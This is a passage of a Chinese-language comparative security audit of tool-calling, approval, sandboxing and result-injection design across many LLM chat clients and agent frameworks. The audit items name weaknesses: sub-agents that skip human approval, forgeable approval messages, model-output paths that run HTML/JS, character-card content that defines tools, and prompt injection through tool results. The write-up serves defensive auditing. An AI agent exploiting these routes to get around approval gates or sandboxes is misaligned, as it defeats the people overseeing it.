| Risuai | 模块 mcp.url 声明（http/stdio/internal/plugin 前缀）+ 插件 registerMCP + Responses web_search_preview 开关；无独立函数注册表 | 四类请求体原生 tools/functionDeclarations 字段（simplifySchema 规整）；请求入口每请求全量 getTools() 拉取 | 无（全量注入、无去重、无 token 预算；enabledModules 不参与 MCP 过滤） |
| SillyTavern | 扩展调 `registerFunctionTool` | 原生 tools 字段，`tool_choice: "auto"` | `function_calling` 开关、provider/模型支持、`shouldRegister` |
| VCPChat | 消费上游目录；自带节点向服务端 `register_tools` | 上游注入 | 客户端不负责收窄 |
| VCPToolBox | 插件 manifest 扫描 | 描述文本进 system prompt，占位符体系 | 插件启用/禁用 |

工具集稳定性有三种不同做法：AIO Hub 将稳定定义与逐轮动态上下文拆开；Jan 对智能路由结果签名并冻结；Hermes Agent 则不缓存 tools 数组，为维持 system prompt cache 而主动缩小全量工具集。Cherry Studio 的 `exposure` 三态（`user`/`internal`/`disabled`）决定工具是给用户看、仅内部调用，还是硬禁用；Manifold Desktop 虽能注入目录，却不应被误计为可执行工具集。

### SDK 使用与控制边界

这里比较 SDK 在工具调用链中的实际职责，而非依赖清单。采用 SDK 不会自动带来审批或执行隔离：需要区分 SDK 只负责协议归一化、SDK 自身执行工具，还是项目自行解析并执行。

| 项目 | SDK / 协议位置 | 对工具边界的含义 |
| --- | --- | --- |
| AIO Hub | 自研 `ToolRegistry`、`ToolCallingProtocol` 与 VCP 文本协议 | 工具发现、文本解析和执行前核验均由应用掌握 |
| AstrBot | 自研 `ToolSet`/runner，Provider adapter 导出三类原生 schema | 目录、协议转换、串行执行和结果回填均由 Python 应用掌握 |
| Chatbox | Vercel AI SDK v6 `ToolSet`，MCP 使用 `@ai-sdk/mcp` | SDK 吸收 Provider tool-call 差异；审批和具体执行仍由应用工具实现承担 |
| Cherry Studio | 普通聊天使用 AI SDK `ToolRegistry`；Claude Code Agent 使用 `@anthropic-ai/claude-agent-sdk` | 前一条路径由应用执行 MCP；后一路径的 Bash/Read/Write 由 SDK 原生二进制执行，应用只能拦截 |
| DeepChat | AI SDK Provider runtime + 自研 `DeepChatLoopEngine`/ToolService | SDK 处理原生流，应用统一 legacy 解析、权限、执行与多轮边界 |
| DeepSeek Harness | 自研 ToolRuntime（vendored Cordis 插件框架）+ llm seam 原生 tool-call 块 | 发现、审批、执行与落盘均由宿主进程掌握；无第三方 agent SDK，LLM adapter 只做词表映射 |
| Hermes Agent | 自研 `tools/registry.py` 注册表 + 自研 transport adapter（OpenAI 兼容 tools / Anthropic / Bedrock / Codex / Codex Responses） | 发现、审批、执行与 RPC 回调全部由 Python 主进程掌握，无第三方 agent SDK；execute_code 沙箱自身提供 `_rpc_server_loop` 工具旁路 |
| Jan | Vercel AI SDK `streamText` + Tauri MCP bridge | SDK 驱动工具循环；MCP 调用越过 JS/Rust 边界到本地进程 |
| LobeHub | 自研 Agent Runtime/builtin registry；MCP client 使用官方 `@modelcontextprotocol/sdk` | 内建工具的策略和执行归 LobeHub；stdio MCP 的进程生命周期由官方 client 启动但无额外沙箱 |
| Manifold Desktop | 自研 C++ Provider adapter + MCP client | SDK/协议只完成 schema 与 tool-call 解析；应用未接执行和续轮 |
| NextChat | 自研 SSE 工具回环 +官方 MCP SDK stdio client | OpenAPI 由应用执行；MCP 是独立文本协议链，不共享原生工具回环 |
| Open WebUI | 自研 FastAPI middleware 循环 + MCP Python client | 服务端掌握目录、循环、结果处理与再请求；direct/pyodide 工具委托浏览器 |
| OpenCode | Vercel AI SDK v6 `streamText` 原生 tool_calls（`llm.ts:318`）；SDK 内部完成工具执行与结果回注 | **工具循环（选择、执行、重试、并行度）全部由 SDK 承担**，opencode 只消费 `fullStream` 事件并做参数校验、审批、截断与持久化；执行发生在 node 主进程内 |
| Pi | 自研 `agent-loop` 编排 + 各 Provider API 原生 tool_calls 适配 | 发现、校验、执行全部由应用掌握；无第三方 agent SDK 参与工具执行 |
| Risuai | 自研 MCP JSON-RPC 客户端（mcplib）与四家 provider 请求适配；无第三方 agent SDK | 发现、注入、解析、执行、回注与持久化全部由前端应用掌握 |
| SillyTavern | 自研 extension action 与多 Provider function-call 适配 | 工具执行在浏览器扩展/服务端 plugin，核心没有 SDK 层的统一审批边界 |
| VCPChat | 自研 VCP 文本协议与分布式节点协议 | 客户端消费上游调用，节点注册和插件执行不经过通用工具 SDK |
| VCPToolBox | 自研文本解析器、plugin manifest 与执行器 | 模型输出到插件执行的协议、审批与分布式转发均由自身实现负责 |

### 模型调用表示与解析

| 项目 | 表示 | 解析边界 |
| --- | --- | --- |
| AIO Hub | 可替换的 `ToolCallingProtocol`；当前唯一实现为 VCP 文本块 | 共享边界扫描跳过 Markdown code fence、inline code 和完整 ESCAPE 区域；坏块可在后续同级请求起点恢复，执行器在协议外二次核验 `agentCallable` |
| AstrBot | Provider 原生 tool call（三类 schema） | runner 查找工具；handler 参数按 schema properties 白名单过滤，未知工具/异常转结果文本 |
| Chatbox | 原生 tool call | provider 差异由 AI SDK 吸收；`toolCallId` 去重 |
| Cherry Studio | 原生 tool call + SDK 消息流 | `mcp__*` 命名与 wire id 映射 |
| DeepChat | 原生 tool call；不支持时 `<function_call>` 文本块 | legacy parser 支持多种 JSON 外形并用 `jsonrepair` 修复，最终归一到同一循环 |
| DeepSeek Harness | 原生 tool-call 块（arguments 为原始 JSON 字符串，传输与落盘不改原文） | 循环层解析参数（失败保留原文、空输入映射 `{}`）后冻结，参数不可改写；参数/输出双校验，一切错误物化为 isError 结果回注、回合不中断 |
| Hermes Agent | 原生 tool call（OpenAI 兼容）；Anthropic/Bedrock/Codex adapter 归一 | `_repair_tool_call` 名称近似修复、JSON 解析重试 ≤3 注入 recovery 结果、`coerce_tool_args` 类型洗边缘；`_AGENT_LOOP_TOOLS` 四个 agent 级工具由编排层特判 |
| Jan | 原生 tool call（AI SDK） | schema 先规整；仅对 Windows 路径反斜杠导致的 JSON 转义错误做 repair |
| LobeHub | 原生 tool call | `identifier`/`apiName` 编解码 |
| Manifold Desktop | 原生 tool call | Gemini/OpenAI/Anthropic 各自解析，最终只渲染，不执行 |
| NextChat | OpenAPI 原生 tool call；MCP fenced JSON 文本块 | 原生 arguments 直接 `JSON.parse`；MCP 用正则提取完整 code fence 后解析 |
| Open WebUI | 原生 tool call / Responses function-call item | `JSON.parse` 失败回退 `ast.literal_eval`；按 spec properties 过滤参数键 |
| OpenCode | 原生 tool call（AI SDK） | `experimental_repairToolCall` 修正工具名大小写，无法修复时改写参数重定向到 `invalid` 工具（llm.ts:296-312）；参数校验失败由 AI SDK 把错误作为结果回注 |
| Pi | 原生 tool call（Provider 适配） | `prepareToolCall` 查找 + TypeBox 校验 + `prepareArguments` shim；未知工具/校验失败转 isError 结果 |
| Risuai | 各家原生结构化字段（tool_calls / tool_use / functionCall / function_call）；`<tool_call>` 标签仅消息内持久化引用 | arguments 仅 JSON.parse，失败转文本错误回注；工具名未注入时写 "No tool found" 消息；无 JSON Schema 校验；Claude 流式不解析 tool_use |
| SillyTavern | 原生 function call，五家格式归一化 | 归一化后按模型返回顺序串行 `await` |
| VCPToolBox | VCP 文本块 | 状态机扫描，带 `fuzzyToolMatching` 开关；**不保护 code fence** |

这里有一处跨项目的实质不一致：**AIO Hub 与 VCPToolBox 跑同一套 VCP 文本协议，但边界容错并不相同。** AIO 会跳过 Markdown 代码块、inline code 和 ESCAPE 参数区，并在未闭合坏块后从下一同级请求起点恢复；VCPToolBox 的状态机不保护 code fence，另有 `fuzzyToolMatching` 开关容忍多种标记变体。同一段模型输出在两端可能得到不同调用集合，这既是兼容性问题，也是安全边界差异。AIO 渲染器还有仅用于显示的模糊恢复，工具执行侧不会因此放宽。

AIO 的 `ToolCallingProtocol` 定义了工具说明生成、协议说明生成、请求解析和结果格式化四个接口，解析与执行引擎都经由该接口完成协议转换和统一请求处理。新增协议仍需修改协议注册表、解析入口与协议配置（`SUPPORTED_PROTOCOLS`、`resolveProtocol()`、`ToolCallConfig.protocol`），属于代码级扩展点，尚未做到运行期插件注册。工具元数据、审批和执行语义没有写死为 VCP，但该接口输入输出仍是字符串，目前预留的是**多种文本协议**，并未直接覆盖模型 API 的结构化 `tool_calls`。VCPToolBox 的工具协议、插件目录与分布式路由则直接围绕 VCP 组织。

### 编排循环的限制

| 项目 | 步数/迭代上限 | 并发 | 工具超时 | 取消语义 |
| --- | --- | --- | --- | --- |
| AIO Hub | 可配置最大迭代 | 同轮可配串/并行 | 可配置 | 审批默认无限等待；可开启按秒级超时（5s–24h）自动拒绝；AbortSignal/会话清理/窗口关闭会拒绝并清理（提交 `a94688ca0`/`f5d26d36a`） |
| AstrBot | `max_agent_step` 默认 30，触顶移除工具强制收尾 | 同轮串行；后台任务独立运行 | `tool_call_timeout`；后台 3600s | abort 信号与执行结果竞争，用户停止可中断 |
| Chatbox | `maxSteps` 恒为 `MAX_SAFE_INTEGER`，实际限制是应用层 25 次调用确认阈值（可经 `pauseOnToolCallLimit` 设置按会话或全局关闭，`1db662a9`） | — | `user_exec` 120s | — |
| Cherry Studio | 默认 `maxToolCalls` 100（`c992af0222`，范围 1-1000；SDK `stopWhen` 兜底仍 `stepCountIs(20)`） | — | MCP 默认 60s，可 per-server | `AbortController` |
| DeepChat | 工具调用总数固定 128；`maxProviderRounds` 可另限 logical round | 按工具 `TOOL_EXECUTION` 合同决定串/并行，写入固定串行 | 审批有超时；工具 transport 超时未统一确认 | 会话清理取消 pending；异常由 `settleTurn` 收口 |
| DeepSeek Harness | 未发现显式迭代上限（终止靠 stop 原因、`concludesTurn` 与 turn-stopping 瀑布） | executionMode 分类：exclusive 屏障 / parallel 滚动池（默认并发 10） | 工具声明 `timeoutMs`，timeout-policy 包装器超时转 `TOOL_TIMEOUT` 结构化错误 | abort 停止补池、排干已启动调用；未启动调用合成 `ABORTED_BEFORE_DISPATCH` 错误结果保回放 |
| Hermes Agent | `max_iterations` + `iteration_budget` 双上限；预算耗尽强制压缩/退出 | `DaemonThreadPoolExecutor`，`_MAX_TOOL_WORKERS=8`；`_plan_tool_batch_segments` 分"平行安全段+顺序障碍" | 批超时默认 420s（`HERMES_CONCURRENT_TOOL_TIMEOUT_S`） | `ConcurrentToolAuthorizationGate` 开始序门（120s）；超时 `_abandon_batch()` 放行排队 worker；中断逐线程 `_set_interrupt`，中断后不写结果防重复上报 |
| Jan | 由 AI SDK/onFinish 循环驱动，未在笔记中确认独立步数上限 | 由 AI SDK 决定 | MCP 可配置 `toolCallTimeoutSeconds` | Tauri MCP 支持 cancellation token 与 cancelToolCall |
| LobeHub | 按 agent 配置；超限设 `forceFinish` 而非硬停（群组编排则直接置 `done`） | `call_tools_batch` 无上限 `Promise.all`；`execSubAgents` 硬编码 15；群组 broadcast 无上限 | 默认 120s，钳制到 [1s, 800s] | client 用 `AbortController` 父子级联；**server 只在步骤边界轮询 `interrupted`，无法中断进行中的 LLM 调用** |
| Manifold Desktop | 字段已定义但执行循环未接通 | 不适用 | MCP 请求 30s | 当前只有 Provider 流取消，无工具任务可取消 |
| NextChat | 无工具步数上限；递归直到模型不再调用 | OpenAPI 同轮 `Promise.all` | 请求级 60s，无单工具独立超时 | 请求 Abort；MCP 文本链无统一工具取消状态机 |
| Open WebUI | `max_tool_call_iterations`；代码解释器检测另最多 5 次 | 普通工具逐项；`delegate_task` 特殊并发且有信号量上限 | 取决于工具/server；无统一值 | 事件/请求链可终止，外部工具的实际取消未共同确认 |
| OpenCode | `agent.steps`（默认 Infinity），最后一轮注入 `MAX_STEPS_PROMPT` 强制收尾（prompt.ts:1178-1181） | 单会话串行（`SessionRunState.ensureRunning`）；单 step 内工具并行由 AI SDK 默认行为 | shell 默认 2 分钟，参数可覆盖；LLM 流级 AbortController | 中断后 `cleanup` 把未完成 tool part 标 `"Tool execution aborted"`；doom-loop 连续 3 次相同入参触发审批 |
| Pi | 未发现迭代上限（终止依赖 stopReason、`shouldStopAfterTurn` 与队列排空） | 默认并行 `Promise.all`，`executionMode: "sequential"` 或配置串行时顺序执行 | bash 工具按参数可选超时，其余无 | AbortSignal 贯穿工具执行；中止立即生效 |
| Risuai | 未找到任何迭代上限（递归直到模型不再调用或 abortSignal） | 串行 await，无并发 | 未找到统一工具超时；续请求失败按 db.requestRetrys 默认 2 重试后以已有结果收尾 | abortSignal 中断后续 fetch；工具调用期间停止生成即中断 |
| SillyTavern | 递归上限 5 | 串行 `await` | — | — |
| VCPToolBox | 有迭代上限 | 同轮 `Promise.all` | 有 | 审批超时 5 分钟后拒绝 |

两处实现特征值得记：一是 Chatbox 的 `maxSteps` 名义无限，真实限制是应用层 25 次调用确认阈值（且该确认点可按会话/全局关闭）；二是 LobeHub 的并发治理采用两套标准——子 agent 批量硬编码上限 15，普通工具批量与群组广播都是无上限的并行请求。

### 审批与策略

| 项目 | 默认方向 | 粒度 | 总开关 | 失效时方向 |
| --- | --- | --- | --- | --- |
| AIO Hub | 可配置 | 工具级 + 方法级（方法级优先） | 有 | 默认无限等待；可开启按秒级超时自动拒绝（`toolApprovalTimeoutSeconds`，5s–24h）；中止/会话清理会拒绝并清理 |
| AstrBot | 非内置工具默认 `member`，即普通成员可用 | 工具级 `member/admin`；内置工具自行检查 | 可通过 tool permissions/启停控制 | 权限读取异常方向未单独运行确认 |
| Chatbox | 高风险需批准 | 命令/路径 | `agentFullAccess`，**有不可绕过类别** | — |
| Cherry Studio | `default` 模式需批准 | 工具名、server id、wildcard | `bypassPermissions` / `acceptEdits` | MCP-source 强制 prompt **优先于** `bypassPermissions` |
| DeepChat | `default` 经 broker；命令按风险分级 | 会话/server/binding/execution/参数 hash；命令 signature | `auto_approve` / `full_access` | pending 有上限与超时，会话清理时取消 |
| DeepSeek Harness | 默认放行；策略瀑布命中 ask 才询问，会话级策略另有 never 确定性拒绝 | 工具级策略瀑布监听器 + per-agent 单调 guard；approval 唯一放行结果 `allowed-once` | permission-presets（workspace-write、danger-full-access）捆绑沙箱模式与审批策略 | 拒绝、取消、通道不可用、无审批服务均转拒绝（fail-closed）；guard 只能拒绝不能放行 |
| Hermes Agent | 危险命令需批准（CLI 交互，fail-closed） | 命令级（`check_dangerous_command` 危险 pattern）+ 工具级（插件 approve 路由 `rule_key`+reason 哈希） | `HERMES_YOLO_MODE` 冻结 / 会话 yolo | 无交互用户、非网关、无 callback、超时 → **全部拒绝（fail-closed）** |
| Jan | 未批准 MCP 工具等待 UI；RAG 可在线程内自动批准 | thread、server、global tool、allow-all | `allowAllMCPPermissions` | UI/水合异常方向未运行确认 |
| LobeHub | **未声明即 `never`（自动执行）** | API 级覆盖 manifest 级 | auto-run 模式，`always` 不可绕过 | connector 权限 DB 异常 → **fail-open**（已核实 scoped 到同用户/workspace，风险有缓解） |
| Manifold Desktop | 不适用：没有执行回环 | 无 | 无 | tool call 只展示后结束 |
| NextChat | 自动执行 | 无统一粒度 | 无 | 解析/未知工具异常可能直接中断当前链 |
| Open WebUI | 以资源访问授权和能力开关为主，无统一逐次确认 | 用户/模型/工具/连接级 AccessGrants | 管理配置与模型绑定 | 未授权连接不注入；各 direct 工具失败方向不同 |
| OpenCode | 权限规则三档 allow/ask/deny；内置 agent 默认 `*:allow` + 关键项 ask（agent.ts:119-136） | 工具名 + pattern（`{pattern: action}`），后写优先 | agent 级 permission + 会话级 permission 合并 | `ask` 无超时 → **永久挂起**；`continue_loop_on_deny` 决定拒绝后是否继续 |
| Pi | 默认自动执行（无审批层） | 无策略粒度；`beforeToolCall` 钩子可整体 block | 无 | 钩子缺失或异常时直接放行 |
| Risuai | 自动执行；仅 internal:risuai 13 个写/删工具执行端逐次 alertConfirm | 仅 internal:risuai 写/删工具逐个；无风险分级 | 无全局审批开关 | 审批拒绝返回 "Access denied by user." 文本且不发生变更；无超时（挂起行为未运行验证） |
| SillyTavern | 无逐次审批 | — | — | — |
| VCPChat | 命中规则自动允许 | 字符串 contains/exact/regex，无风险分级 | — | 规则可配成 `.*` → 全部自动通过 |
| VCPToolBox | 命中规则才审批 | 工具名 + 参数匹配 | — | 超时/无连接 → **拒绝（fail-closed）** |

同一个策略层在不同项目里的失效方向相反：VCPToolBox 与 Hermes Agent 超时/无交互时拒绝，DeepChat 的 pending 有上限与超时并在会话清理时取消，OpenCode 的 `ask` 无超时会永久挂起（AIO Hub 已把同类挂起改为可配置超时，默认仍无限等待），LobeHub 的 connector 权限查询失败则放行。评估“有审批”时必须同时记录其绑定粒度和失效方向。

Chatbox 的 `AppActionApprovalPausedError` 值得单独点出：计费与应用状态变更类操作与 `agentFullAccess` 脱钩，用户即使开启完全放行也绕不过。DeepChat 走另一条路线：不设置不可绕过类别，而是让每条批准记录绑定完整执行身份和参数 hash；二者解决的是不同问题。

### 执行位置与隔离

| 项目 | 执行域 | 隔离手段 | 平台差异 |
| --- | --- | --- | --- |
| AIO Hub | Tauri 渲染进程、Rust 命令、远端 VCP 节点 | 前端沙箱已加固（真实路径解析 + `isPathWithinRoot` 边界判断）；普通 force 命令 Rust 侧仍无路径限制（`fs:allow-*` 均为 `{"path":"**"}`），`checkSecurityPolicy` 仍只读 `args.path` | 未见分支 |
| AstrBot | Python 主进程、MCP server、后台/子 Agent | 权限 wrapper、工具自身检查、超时与结果预算；无统一 OS 沙箱 | computer tools 按运行环境分档 |
| Chatbox | 主进程、MCP 子进程、SRT 沙箱、宿主 shell | macOS/Linux 用 `@anthropic-ai/sandbox-runtime` | **Windows 无 OS 级沙箱**，代码注释自述 "no OS isolation" |
| Cherry Studio | Electron 主进程、MCP 子进程、SDK 原生二进制 | `disallowedTools` + `canUseTool` + `PreToolUse` hook 三层；**不持有执行本身** | — |
| DeepChat | Electron 主进程 ToolService、MCP server/子进程 | broker + 命令风险 + workspace containment；具体 MCP transport 隔离未运行确认 | ACP-backed subagent 不使用 DeepChat 工具目录 |
| DeepSeek Harness | 宿主进程内（agent-loop 调度器）；shell/terminal 经子进程；MCP stdio 子进程或 streamable-http | 文件/shell/子进程能力抽象为 seam provider（本地/沙箱/E2B 可互换）；tool-fs 逐调用解析沙箱策略并过 fs 事件门 | bash/pwsh 按平台条件加载（win32 与排除互斥） |
| Hermes Agent | Python 主进程（全部工具）；execute_code 的代码在沙箱子进程（本机=临时目录+子进程，容器/远程=环境容器） | Docker/Modal/Daytona/Singularity/Vercel Sandbox 容器资源上限；本机 `local` backend 无沙箱强制；terminal 子调用剥离 `background/pty/notify_on_complete/watch_patterns` | 容器且 `has_host_access=False` 时跳过危险命令审批，本地无此豁免 |
| Jan | Web/Tauri 前端、Rust MCP 进程桥、Web 搜索插件 | 四级审批、禁用列表、OS keyring；MCP 进程隔离未确认 | Tauri 桌面路径与浏览器 fallback 不同 |
| LobeHub | server runtime、cloud gateway、用户设备、本地 MCP | 云沙箱隔离；`local-system` 走 pathScopeAudit + 通用黑名单 | 桌面端 `executors: ['client']` 就地执行 |
| Manifold Desktop | 当前无工具执行；stdio/SSE transport 已实现 | stdio 将以宿主用户启动，无沙箱/审批，但主链尚未调用 | Windows `CreateProcessW`；参数以空格拼接 |
| NextChat | 浏览器 HTTP、桌面 MCP stdio 子进程 | 无框架级沙箱或审批；MCP 继承完整环境变量 | MCP 只在支持桌面进程能力的路径可用 |
| Open WebUI | Python 服务端、浏览器 direct/pyodide、Jupyter、远端 MCP/OpenAPI | AccessGrants、能力开关、Jupyter blocked modules；MCP 默认不校 TLS | 部署者决定服务端/Jupyter/浏览器的实际隔离 |
| OpenCode | node 主进程（全部工具）；shell 为普通子进程；MCP stdio 子进程；code-mode 沙箱解释器（实验 flag） | **shell 无沙箱**，权限审批 + `external_directory` 工作区外检查 + 2 分钟超时兜底；MCP 退出时递归杀进程树 | Windows 走 PowerShell `-NoProfile -NonInteractive`；无平台级隔离差异 |
| Pi | 本地进程内执行；bash 为 `spawn` 子进程（进程树终止、可选超时） | 无框架级沙箱；默认以启动用户权限运行，隔离靠外部容器化 | `detached`/进程树终止在非 Windows 与 Windows 有平台分支 |
| Risuai | 全前端 JS 上下文：远程 MCP 桌面经 Tauri Rust 侧 fetch（web 走 CORS 代理）、stdio 为 Tauri shell 子进程（仅桌面）、插件工具在 iframe 沙箱、内置工具直接操作浏览器 API 与数据库 | 插件 iframe 沙箱（CSP connect-src 'none' + API 白名单）；internal:fs 依赖 File System Access 目录句柄；无框架级沙箱；MCP URL 只校验 http/https 前缀、未发现 SSRF 过滤 | stdio 仅桌面；web 端 fetchNative 拒绝 localhost/内网请求 |
| SillyTavern | 浏览器前端、服务端 plugin | 无工具级隔离 | — |
| VCPChat | **自带 `VCPDistributedServer` 子进程**、远端 ToolBox | 自带节点对自己的插件也不做隔离 | — |
| VCPToolBox | Node/Python/native 子进程、分布式节点 | 无框架级沙箱；`LinuxShellExecutor` 自带八层校验与可选 bubblewrap/firejail/docker，`PowerShellExecutor` 只有关键字黑名单 | 两个 shell 插件风险等级不对等 |

Cherry Studio 这一行的"不持有执行本身"是理解它的关键：Claude Code 的 Bash/Read/Write 由 SDK 自带原生二进制执行，Cherry 只能通过禁用列表、`canUseTool` 回调和 hook 去拦，无法在执行点上加沙箱。这与 Chatbox 自己起沙箱进程、LobeHub 自己控制云沙箱是不同的权力位置。

AIO Hub 的路径沙箱需要特别标注：前端沙箱已加固——`resolve_path_for_security` 先解析真实路径（符号链接）再按 `isPathWithinRoot` 做边界判断，白名单与规则路径同样解析，删除文件走回收站。但普通 force 命令（`read_text_file_force`/`write_text_file_force`）在 Rust 侧仍不做路径限制，`checkSecurityPolicy` 仍只读 `args.path`（多路径方法缺失时校验面仍有缺口）；`directory-tree`、`dir-search`、`ffmpeg-tools` 等不复用该校验的工具仍没有沙箱。

### 结果回注

| 项目 | 截断 | 标记 | 输出侧过滤 |
| --- | --- | --- | --- |
| AIO Hub | 有迭代与超时限制 | — | 无 |
| AstrBot | 27.5k token 后落盘，保留约 7k token 预览 | overflow notice + 文件路径；图片另落盘 | 无 |
| Chatbox | stdout/stderr 各 1 MB | — | 无 |
| Cherry Studio | 有 | — | 无 |
| DeepChat | 单项目笔记未确认统一截断值 | `tool_calls` 字段 + `role: 'tool'` 回注（含 `tool_call_id`），经 contextBuilder 进入下一轮 | 未确认 |
| DeepSeek Harness | spill-policy 默认 50KB 内联上限，tool-result-pruner 在 post-execute/compaction 改写（未深入） | `tool/result` 落盘后投影为 user-role 工具结果消息回注（source 带 callId）；规范值不落盘 | 无 |
| Hermes Agent | per-tool 上限（默认 100K）+ per-turn 聚合预算（200K）+ preview 1.5K，三层持久化落盘回填 | `<persisted-output>` 标记 + 文件引用 | 无 |
| Jan | 工具卡 UI 600 字符折叠不等于模型侧截断；模型侧统一上限未确认 | `tool-<name>` part、elapsed/progress/citation | 未确认 |
| LobeHub | 默认 25000 字符，可按 agent 覆盖 | 追加明确的截断字符数提示，全文归档到 VFS 并告知取回路径 | 无 |
| Manifold Desktop | 不适用：无结果回注 | 只显示 tool call | 不适用 |
| NextChat | 未确认统一结果截断 | OpenAPI 用 `role: tool`；MCP 用 `isMcpResponse` 用户消息 | 无 |
| Open WebUI | 依工具实现；未确认统一字符上限 | function_call_output、引用 source、图片 input_image、HTML embed | 无统一过滤层 |
| OpenCode | 默认 2000 行 / 50KB（config `tool_output` 可覆盖），超限落盘 `tool-output/` 7 天保留 | `metadata.truncated` + `outputPath`，提示用 Task/Grep/Read 接力 | 无 |
| Pi | bash/read 等按字节/行数截断并落全量文件（`truncate.ts`、`fullOutputPath`） | 截断提示随结果文本回注 | 无 |
| Risuai | 笔记未涉及截断 | 按各家协议回注（role:'tool' / tool_result / functionResponse / function_call_output）；`<tool_call>` 标签 + localforage ID 引用持久化（OpenAI 链图片块被丢弃、Claude 转 base64） | 笔记未涉及 |
| SillyTavern | — | — | 无 |
| VCPToolBox | 有 | — | 无 |

十七个已形成执行回环的项目中，本次单项目笔记都未确认存在统一的工具结果内容信任标记或输出侧过滤层；Manifold Desktop 因无结果回注不适用。截断只解决过长，不解决内容是否可信。Hermes Agent、AstrBot、LobeHub、OpenCode 和 Pi 都有落盘/预览方案，其中 LobeHub 与 OpenCode 的截断提示对模型后续取回动作说明最明确；Open WebUI 还把部分搜索/文件结果转成引用来源，但这些都不等于隔离不可信内容。

## 基础审计框架

### 1. 工具目录、执行器和审批状态是否分离

分别检查模型可见的工具定义、运行时可执行的方法和当前获准的调用。三者合并在同一个扩展 action 或动态对象上时，安装信任通常会取代细粒度权限控制；三者分离时，还要确认执行器不会只凭名称调用未暴露的方法。

### 2. 执行端是否重新验证审批

确认禁用和强制审批在真正执行前再次检查，拒绝、超时与取消产生确定结果，同一调用不能被重复提交。审批 UI 只负责收集决定，不能成为唯一强制点；跨进程或分布式调用还要绑定请求身份与发起者。

### 3. MCP、Skill 和 Plugin 的权限模型是否被区分

MCP 通常连接本机进程或远端服务，Skill 通常是模型可读的指令或流程文本，Plugin 往往是与宿主同权的可执行代码。格式校验、安装警告和 manifest 声明不能替代执行时的权限检查。

### 4. 平台和部署路径是否改变工具边界

同一工具在 Windows、macOS、Linux、云端、桌面端和用户设备上可能走完全不同的执行器与隔离层。审批规则应同时描述能力、目标位置、文件或网络范围及平台，不能只按工具名授权。

### 5. 结果回注是否受限

检查超时、大小截断、流式中断、拒绝结果和恶意输出。输出大小限制只能控制上下文膨胀，不能阻止工具结果中的 prompt 注入；还需区分可信系统状态与不可信工具内容。

## 深入审计项

基础五条用于建立结构边界，下面八条用于进一步区分实现质量；每条都至少在一个项目上已确认命中。

### 1. 子 Agent 是否构成审批绕过路径

**LobeHub 已确认命中。** `callSubAgent` 派出的子 agent 以 `approvalMode: 'headless'` 运行，即跳过人工审批门；而该入口本身 `humanIntervention` 未声明，默认自动执行。父 agent 只要能派子 agent，就等于获得一条绕开审批的执行路径。嵌套虽有三层阻断（manifest 过滤、执行体自检、runtime 兜底），但三层都依赖同一个 `isSubAgent` 布尔位。

Cherry Studio 的同类问题尚未验证（子 agent 是否共享父会话权限策略快照，依赖 SDK 内部实现）。Hermes 的 `delegate_tool` 默认按 `_subagent_auto_deny` 拒绝，配置 `delegation.subagent_auto_approve` 后才改用 `_subagent_auto_approve` 放行；子代理是否在 `dispatch` 执行阶段逐次复验 `enabled_tools` 尚未验证（见未验证项）。检查任何支持 agent-as-tool 的实现时，这应是第一个问题。

### 2. 协议两端的解析语义是否一致

**AIO Hub 与 VCPToolBox 已确认不一致**（code fence、ESCAPE 与坏块恢复，见上文）。凡是同一文本协议由多个独立实现解析的架构，都要逐边界比对：code fence、inline code、嵌套、参数含分隔符、流式截断、畸形块、同轮多块、大小写与空白容忍。任一端更宽松，整个系统的有效边界就是最宽松那一端。

### 3. 策略层失效时的方向

已确认三种不同方向：VCPToolBox fail-closed、LobeHub connector 权限查询 fail-open、OpenCode `ask` 无超时导致永久挂起（AIO Hub 的同类挂起已改为可配置超时，默认关闭）。要分别测：审批终端离线、审批超时、权限存储不可用、网关不可达。

### 4. 审批链路是否有消息级鉴权

**VCPChat 与 VCPToolBox 两端都已确认只有连接级鉴权。** ToolBox 侧把审批请求广播给所有已认证 `VCPLog` 客户端，任何持同一全局 `VCP_Key` 的连接都能批准或拒绝任意请求（requestId 随广播暴露）；VCPChat 侧只在建连时做一次性 Key 握手，之后同一条 WebSocket 上收到的任何 `tool_approval_request` 都被无条件信任并可被自动规则批准。审批身份没有绑定发起者，也没有区分"谁有权批准"。

### 5. 是否存在绕开自身审批协议的旁路能力

已确认三条真正由**模型输出**触发的旁路：VCPChat 的 `DESKTOP_PUSH`（模型输出特定标记即在 renderer 侧被拦截并在桌面画布执行 HTML+JS，无审批无白名单）、AIO Hub 的 `data-filter` `customScript`（Agent 路径已隔离——`parseFilterOptions()` 对 custom 操作符或含 `customScript` 的条件直接返回错误，`new Function()` 只保留在用户手动操作的 DataFilter.vue 界面路径，模型生成的 VCP 参数不再能触发任意 JS）、Hermes 的 `execute_code` 沙箱 RPC（沙箱内代码经 `_rpc_server_loop` 在父进程线程回调 `handle_function_call`，给定 allow-list 后执行已允许工具，不重复走编排层审批门；该清单与主会话工具面一致）。VCPToolBox 的 `/plugin-callback/:pluginName/:taskId` 是另一类：无鉴权的外部 HTTP 入口，可伪造异步任务结果注入下一轮上下文，触发方是网络对端而非模型。

审计时不要只看工具目录和审批配置，要搜"模型输出能触发的所有代码路径"——但也要反向区分：**入向协议义务不等于模型可用的旁路**，详见审计项 ⑧。

### 6. 工具目录是否有命名冲突检测

**Chatbox 已确认命中。** 知识库工具集与文件系统工具集都注册 `list_files`，合并顺序让后者静默覆盖前者，模型实际无法调用"列知识库文件"。这是功能 bug 而非安全问题，但暴露了动态组装工具集缺少冲突检测——同样的缺失若发生在权限不同的两个同名工具上就是安全问题。VCPToolBox 的分布式 `register_tools` 会跳过同名工具（防覆盖），但不防"注册一个诱导性命名的新工具"（如 `FileOperator2`）来钓鱼。

### 7. 工具定义能否由内容而非代码提供

**SillyTavern 已确认命中。** `/tools-register` 可以把一段 STscript closure 注册为模型可调用的工具，而对 action closure 的来源没有任何限制。如果这条命令来自角色卡首条消息、World Info 词条正文，或由 `automationId` 触发的 Quick Reply，那么**内容发布者就能在受害者不知情的情况下为该角色永久定义任意工具**，其 action 可以是任意 STscript（`/genraw` 发起隐藏生成、`/inject` 篡改后续 prompt、读写全局变量）。

这类风险与"安装了不可信扩展"不同：受害者只是导入了一张角色卡或一个世界书，通常不会被视为安装软件。审计任何支持"数据即脚本"的实现时，都要问：工具定义的来源是否被限制为代码，还是用户内容也能定义工具。

**模型自己输出的文本不会被当作 slash command 执行。** `processCommands` 只解析用户主动发送的以 `/` 开头的消息。因此 SillyTavern 的注入放大路径是“内容定义工具”，不是“模型输出直接执行命令”。

### 8. 区分"协议义务"与"模型可达的工具"

